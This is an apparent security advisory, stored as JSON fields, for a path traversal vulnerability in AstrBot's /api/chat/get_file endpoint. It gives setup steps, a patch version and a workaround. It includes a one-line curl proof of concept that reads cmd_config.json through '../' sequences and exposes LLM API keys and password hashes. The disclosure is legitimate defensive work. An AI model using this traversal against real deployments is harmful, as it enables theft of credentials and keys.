  "summary": "AstrBot Has Path Traversal Vulnerability in /api/chat/get_file",
  "details": "### Impact\n\nThis vulnerability may lead to:\n\n* Information disclosure, such as API keys for LLM providers, account passwords, and other sensitive data.\n\n### Reproduce\n\nFollow these steps to set up a test environment for reproducing the vulnerability:\n\n1. Install dependencies and clone the repository:\n\n   ```bash\n   pip install uv\n   git clone https://github.com/AstrBotDevs/AstrBot \u0026\u0026 cd AstrBot\n   uv run main.py\n   ```\n\n2. Alternatively, deploy the program via pip:\n\n   ```bash\n   mkdir astrbot \u0026\u0026 cd astrbot\n   uvx astrbot init\n   uvx astrbot run\n   ```\n\n3. In another terminal, run the following command to exploit the vulnerability:\n\n   ```bash\n   curl -L http://0.0.0.0:6185/api/chat/get_file?filename=../../../data/cmd_config.json\n   ```\n\nThis request will read the `cmd_config.json` config file, leading to the leakage of sensitive data such as LLM API keys, usernames, and password hashes (MD5).\n\n### Patches\n\nThe vulnerability has been addressed in [Pull Request #1676](https://github.com/AstrBotDevs/AstrBot/pull/1676) and is included in versions \u003e= v3.5.13. All users are strongly encouraged to upgrade to v3.5.13 or later.\n\n### Workarounds\nUsers can edit the cmd_config.json file to disable the dashboard feature as a temporary workaround. However, it is strongly recommended to upgrade to version v3.5.13 or later as soon as possible to fully resolve this issue.\n\n### References\n\n* [Pull Request #1676](https://github.com/AstrBotDevs/AstrBot/pull/1676)\n* [Issue #1675](https://github.com/AstrBotDevs/AstrBot/issues/1675)",
